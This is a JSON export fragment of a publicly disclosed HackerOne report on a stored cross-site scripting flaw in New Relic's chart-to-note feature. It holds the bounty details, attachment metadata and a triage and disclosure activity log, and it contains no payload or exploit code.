UpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=fa93c02339022673b06d01c1a3a736cba29671e84f37c9784ccb1a77d4b966f1\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eWhen a victim tries to add a chart to note, the arbitrary malicious code is executed.\u003c/p\u003e\n","bounty_amount":"2500.0","formatted_bounty":"$2,500","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":484252,"file_name":"______________2019-05-04___17.26.01.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/484/252/e4719126be408642df7b78ec2484aff470a24e31/______________2019-05-04___17.26.01.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-05-04___17.26.01.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-05-04___17.26.01.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T062132Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026X-Amz-Signature=c0aadb8637f6a998b0e2dba444c68b5ab92aa8efff2b6828dc693aa4487a6420","file_size":163225,"type":"image/png"},{"id":484275,"file_name":"______________2019-05-04___18.23.59.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/484/275/e9ade6d1fd8405753d959d4dd85b10eafe0db47f/______________2019-05-04___18.23.59.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-05-04___18.23.59.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-05-04___18.23.59.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T062132Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026X-Amz-Signature=1b21d77b1aeaee2743a1bcb0f3e78fff849c3796b6a558a7798efbc8940d23ad","file_size":300737,"type":"image/png"},{"id":484277,"file_name":"nr_xss_add_to_note.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/484/277/f4226cb604ec7f36827d18364be5ecfe7ba4e9a4/nr_xss_add_to_note.mp4?response-content-disposition=attachment%3B%20filename%3D%22nr_xss_add_to_note.mp4%22%3B%20filename%2A%3DUTF-8%27%27nr_xss_add_to_note.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T062132Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026X-Amz-Signature=fa93c02339022673b06d01c1a3a736cba29671e84f37c9784ccb1a77d4b966f1","file_size":13325540,"type":"video/mp4"}],"allow_singular_disclosure_at":"2020-09-10T09:32:22.813Z","allow_singular_disclosure_after":-9492550.07116179,"singular_disclosure_allowed":true,"vote_count":16,"voters":["wi11","mygf","joaovitormaia","naategh","cryptographer","pkhadka","rajeshmoravaneni","meispi","crayonplay","vangogh001","and 6 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":18678,"asset_type":"URL","asset_identifier":"rpm.newrelic.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4768232,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry for the delay! I have reproduced this. Let me get back to you on whether this is a duplicate or solved by another ticket we have.","markdown_message":"\u003cp\u003eSorry for the delay! I have reproduced this. Let me get back to you on whether this is a duplicate or solved by another ticket we have.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-07T15:21:44.867Z","updated_at":"2019-05-07T15:21:44.867Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4770822,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Confirmed that this was in fact a different vulnerability! Thank you for finding these. We appreciate you here at New Relic!","markdown_message":"\u003cp\u003eConfirmed that this was in fact a different vulnerability! Thank you for finding these. We appreciate you here at New Relic!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-07T21:19:44.468Z","updated_at":"2019-05-07T21:19:44.468Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4770833,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-07T21:25:24.553Z","updated_at":"2019-05-07T21:25:24.553Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"New Relic"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","attachments":[{"id":486171,"filename":"money.gif","type":"image/gif","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/486/171/79a2981a8ff650b3717b47c32573a556bbd66593/money.gif?response-content-disposition=attachment%3B%20filename%3D%22money.gif%22%3B%20filename%2A%3DUTF-8%27%27money.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T062132Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026X-Amz-Signature=c478502f634cfff5ea35ec79b94288280d28a5fe4cd7161a6bff445bfe416db8"}],"genius_execution_id":null,"team_handle":"newrelic","collaborator":{"username":"skavans","url":"/skavans"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5463357,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-30T16:55:55.079Z","updated_at":"2019-07-30T16:55:55.079Z","actor":{"username":"tgalloway","cleared":false,"url":"/tgalloway","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/612/974/4479560d844e2c7759ecb6c4915bd92e4ab8d698_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"skavans","url":"/skavans"},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8902530,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-11T09:32:22.793Z","updated_at":"2020-08-11T09:32:22.793Z","first_to_agree":true,"actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8923205,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can we disclose this?","markdown_message":"\u003cp\u003eCan we disclose this?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-13T08:31:11.368Z","updated_at":"2020-08-13T08:31:11.368Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8924739,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-13T10:58:02.630Z","updated_at":"2020-08-13T10:58:02.630Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8924740,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-13T10:58:02.714Z","updated_at":"2020-08-13T10:58:02.714Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}